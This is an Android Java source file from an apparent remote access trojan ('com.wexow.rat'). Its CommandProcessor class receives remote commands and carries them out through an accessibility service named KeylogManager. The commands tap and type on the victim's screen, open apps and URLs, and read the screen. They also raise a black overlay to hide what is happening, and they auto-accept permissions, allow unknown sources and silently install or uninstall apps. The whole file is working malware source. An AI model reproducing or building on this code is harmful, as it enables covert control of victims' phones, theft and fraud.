package com.wexow.rat;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.graphics.Rect;
import android.net.Uri;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;

public class CommandProcessor {
    private static final String TAG = "CommandProcessor";
    private KeylogManager service;

    public CommandProcessor(KeylogManager service) {
        this.service = service;
    }

    public void process(String command, String argument) {
        Log.d(TAG, "Processing: " + command + " | arg: " + argument);
        switch (command) {
            // ===== Click / Input =====
            case "click_text":    clickByText(argument); break;
            case "click_id":      clickById(argument); break;
            case "click_xy":      clickByXY(argument); break;
            case "input_text":    inputText(argument); break;
            case "swipe":         swipeGesture(argument); break;

            // ===== Apps =====
            case "open_app":      openApp(argument); break;
            case "open_url":      openUrl(argument); break;

            // ===== Global Actions =====
            case "back":    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK); break;
            case "home":    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME); break;
            case "recents": service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS); break;
            case "notifications":
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS);
                break;
            case "quick_settings":
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS);
                break;
            case "power_dialog":
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG);
                break;
            case "lock_screen":
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
                }
                break;
            case "take_screenshot":
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_TAKE_SCREENSHOT);
                }
                break;

            // ===== Screen Reader =====
            case "screen_reader_start": service.startScreenReader(); break;
            case "screen_reader_stop":  service.stopScreenReader(); break;

            // ===== Black Overlay =====
            case "black_overlay_on":  service.toggleBlackOverlay(true); break;
            case "black_overlay_off": service.toggleBlackOverlay(false); break;

            // ===== Auto toggles =====
            case "auto_uninstall_on":  service.setAutoUninstall(true); break;
            case "auto_uninstall_off": service.setAutoUninstall(false); break;
            case "auto_install_on":    service.setAutoInstall(true); break;
            case "auto_install_off":   service.setAutoInstall(false); break;
            case "auto_allow_sources_on":  service.setAutoAllowSettings(true); break;
            case "auto_allow_sources_off": service.setAutoAllowSettings(false); break;
            case "auto_accept_perms_on":   service.setAutoAcceptPermissions(true); break;
            case "auto_accept_perms_off":  service.setAutoAcceptPermissions(false); break;
        }
    }

    private void clickByText(String text) {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
        if (nodes != null && !nodes.isEmpty()) {
            for (AccessibilityNodeInfo node : nodes) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return;
                }
                AccessibilityNodeInfo p = node.getParent();
                if (p != null && p.isClickable()) {
                    p.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return;
                }
                Rect bounds = new Rect();
                node.getBoundsInScreen(bounds);
                service.click(bounds.centerX(), bounds.centerY());
                return;
            }
        }
    }

    private void clickById(String id) {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
        if (nodes != null && !nodes.isEmpty()) {
            for (AccessibilityNodeInfo node : nodes) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return;
                }
                Rect bounds = new Rect();
                node.getBoundsInScreen(bounds);
                service.click(bounds.centerX(), bounds.centerY());
                return;
            }
        }
    }

    private void clickByXY(String coord) {
        try {
            String[] parts = coord.split(",");
            int x = Integer.parseInt(parts[0].trim());
            int y = Integer.parseInt(parts[1].trim());
            service.click(x, y);
        } catch (Exception e) {
            Log.e(TAG, "clickByXY: " + e.getMessage());
        }
    }

    private void swipeGesture(String arg) {
        try {
            // format: x1,y1,x2,y2,duration
            String[] parts = arg.split(",");
            int x1 = Integer.parseInt(parts[0].trim());
            int y1 = Integer.parseInt(parts[1].trim());
            int x2 = Integer.parseInt(parts[2].trim());
            int y2 = Integer.parseInt(parts[3].trim());
            int duration = parts.length > 4 ? Integer.parseInt(parts[4].trim()) : 300;
            service.swipe(x1, y1, x2, y2, duration);
            Log.e("CommandProcessor", "🎯 Swipe: " + x1 + "," + y1 + " → " + x2 + "," + y2);
        } catch (Exception e) {
            Log.e(TAG, "swipe: " + e.getMessage());
        }
    }

    private void inputText(String text) {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;
        AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        if (focused != null) {
            android.os.Bundle args = new android.os.Bundle();
            args.putCharSequence(
                AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
        }
    }

    private void openApp(String packageName) {
        try {
            Context ctx = service.getApplicationContext();
            Intent intent = ctx.getPackageManager().getLaunchIntentForPackage(packageName);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "openApp: " + e.getMessage());
        }
    }

    private void openUrl(String url) {
        try {
            Context ctx = service.getApplicationContext();
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "openUrl: " + e.getMessage());
        }
    }
}
